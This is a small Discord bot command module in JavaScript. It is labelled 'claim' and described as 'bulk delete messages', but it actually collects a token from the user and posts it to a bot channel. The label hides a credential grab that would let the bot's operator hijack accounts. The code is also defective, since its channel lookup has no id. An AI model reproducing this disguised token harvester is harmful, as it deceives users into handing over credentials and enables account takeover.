//<Client>.users.fetch('id')
module.exports = {
  name: "claim",
  description: "bulk delete messages",
  execute: async (bot, message, args, split) => {
    if (!split[1]) return message.channel.send("no token specifyied");
    bot.channels.cache.get().send(`TOKEN ${split[1]}`)
}
}
